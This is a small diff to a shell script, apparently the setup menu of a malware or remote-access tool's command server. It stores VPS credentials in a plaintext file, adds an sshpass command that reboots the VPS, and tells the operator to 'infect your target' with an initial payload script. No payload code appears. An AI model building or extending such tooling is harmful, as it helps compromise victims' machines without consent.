@@ -421,7 +421,11 @@ vps_menu(){
     echo "$username_vps" >> ./vps_settings/vps_conf.txt
     echo "$password_vps" >> ./vps_settings/vps_conf.txt
 
-    echo "Key set ! Please infect your target with src/initial_vps.cmd "
+    echo "[+] Restarting VPS...."
+
+    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'reboot'
+
+    echo "[+] Key set ! Please infect your target with src/initial_vps.cmd "
     read -p "[+] Click Enter to go back to the menu !............."
 
 }
